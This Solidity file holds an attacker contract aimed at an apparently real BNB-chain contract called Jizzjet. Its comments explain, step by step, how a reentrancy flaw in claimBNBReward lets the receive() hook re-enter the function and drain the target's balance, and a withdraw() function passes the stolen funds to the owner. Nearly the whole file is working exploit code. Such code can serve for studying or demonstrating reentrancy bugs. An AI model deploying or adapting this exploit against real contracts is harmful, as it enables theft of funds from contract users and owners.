// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.20;

/**
 * @title IVulnerable
 * @author Carl
 * @notice Interface for the vulnerable Jizzjet contract.
 * The vulnerability exists in the claimBNBReward function, which sends BNB
 * to the caller before updating their claimed amount. This allows for a reentrancy attack.
 */
interface IVulnerable {
    function claimBNBReward() external;
    function getBNBReward(address) external view returns (uint256);
}

/**
 * @title Attacker
 * @author Carl
 * @notice This contract exploits a reentrancy vulnerability in the Jizzjet contract.
 * The attack proceeds as follows:
 * 1. The attacker calls the `attack()` function.
 * 2. The `attack()` function calls `claimBNBReward()` on the vulnerable target contract.
 * 3. The target contract calculates the reward and sends BNB to this Attacker contract
 *    using a low-level .call{value: ...}('').
 * 4. The transfer of BNB triggers this contract's `receive()` function before the target
 *    contract can update the attacker's claimed balance.
 * 5. Inside the `receive()` function, we check if the target contract still has a balance
 *    greater than the reward we are about to claim.
 * 6. If it does, we re-enter the `claimBNBReward()` function, which again sends the *same*
 *    reward because the state on the victim has not been updated.
 * 7. This loop continues, draining the BNB from the vulnerable contract until its balance
 *    is depleted.
 */
contract Attacker {

    IVulnerable public target;
    address public owner;

    // To prevent the reentrancy loop from running out of gas, we can limit the number of re-entrant calls.
    uint256 public reentrancy_limit = 10;
    uint256 public reentrancy_count = 0;


    constructor(address payable _target) {
        target = IVulnerable(_target);
        owner = msg.sender;
    }

    // The receive function is the entry point for the reentrancy attack.
    // It gets triggered when the vulnerable contract sends BNB.
    receive() external payable {
        // Check if there are still funds to drain and we haven't hit our re-entrancy limit.
        if (address(target).balance > 0 && reentrancy_count < reentrancy_limit) {
            reentrancy_count++;
            // Re-enter the claimBNBReward function to drain more funds.
            target.claimBNBReward();
        }
    }

    /**
     * @notice Initiates the reentrancy attack.
     * This function should be called after this contract has accumulated rewards
     * in the target contract.
     */
    function attack() external {
        require(msg.sender == owner, "Only owner can attack");
        reentrancy_count = 0;
        // Start the attack by claiming the initial reward.
        target.claimBNBReward();
    }

    /**
     * @notice A helper function to withdraw the funds stolen from the target contract.
     */
    function withdraw() external {
        require(msg.sender == owner, "Only owner can withdraw");
        payable(owner).transfer(address(this).balance);
    }
}